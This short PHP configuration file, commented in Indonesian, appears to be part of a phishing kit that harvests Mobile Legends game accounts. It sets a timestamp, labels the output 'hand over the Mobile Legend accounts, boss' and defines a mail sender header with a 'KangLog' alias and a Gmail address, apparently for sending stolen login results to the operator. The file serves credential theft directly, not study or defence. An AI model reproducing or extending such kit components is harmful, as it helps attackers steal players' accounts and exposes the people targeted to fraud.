<?php 
// KONTROL UNTUK MENDAPATKAN ZONA WAKTU (JAKARTA)
date_default_timezone_set('Asia/Jakarta');
$jamasuk = date('l, d-m-Y h:i:s');

// KONTROL UNTUK HALAMAN KIRIM RESULT
$author = 'SETOR AKUN MOBILE LEGEND BOS';
$sender = 'From:  ꧁ 𝔽𝔹 | 𝕂𝕒𝕟𝕘𝕃𝕠𝕘 𝕊𝕙𝕠𝕥𝕣𝕖 ꧂ <itsme.arpantek@gmail.com>'; 
?>